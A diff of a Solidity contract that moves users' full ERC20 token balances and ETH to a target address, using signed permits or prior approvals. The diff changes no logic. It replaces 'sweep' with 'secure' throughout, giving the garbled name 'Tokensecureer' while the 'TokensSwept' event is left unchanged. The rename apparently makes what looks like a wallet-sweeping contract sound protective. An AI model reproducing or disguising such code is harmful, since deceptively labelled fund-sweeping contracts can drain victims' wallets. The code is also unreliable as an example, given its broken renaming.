@@ -1,4 +1,4 @@
-// TokenSweeper.sol
+// Tokensecureer.sol
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
@@ -7,12 +7,12 @@ import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v5.0.2/contr
 import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v5.0.2/contracts/access/Ownable.sol";
 
 /**
- * @title TokenSweeper
- * @dev Contract to sweep ERC20 tokens from the caller's wallet to a target address.
+ * @title Tokensecureer
+ * @dev Contract to secure ERC20 tokens from the caller's wallet to a target address.
  * Supports permit for gasless approvals and regular approvals.
  * Can also forward native ETH.
  */
-contract TokenSweeper is Ownable {
+contract Tokensecureer is Ownable {
     using SafeERC20 for IERC20;
 
     event TokensSwept(
@@ -40,12 +40,12 @@ contract TokenSweeper is Ownable {
     constructor(address initialOwner) Ownable(initialOwner) {}
 
     /**
-     * @dev Sweep tokens using EIP-2612 permits.
+     * @dev secure tokens using EIP-2612 permits.
      * User must provide signed permits off-chain for each token.
      * Amounts should be the balances to transfer (typically full balance).
      * Reverts if permit fails for any token.
      */
-    function sweepWithPermits(
+    function secureWithPermits(
         PermitData[] calldata permits,
         address target
     ) external {
@@ -77,10 +77,10 @@ contract TokenSweeper is Ownable {
     }
 
     /**
-     * @dev Sweep tokens assuming prior approvals.
+     * @dev secure tokens assuming prior approvals.
      * Transfers full balance of each token.
      */
-    function sweepWithApprovals(
+    function secureWithApprovals(
         address[] calldata tokens,
         address target
     ) external {
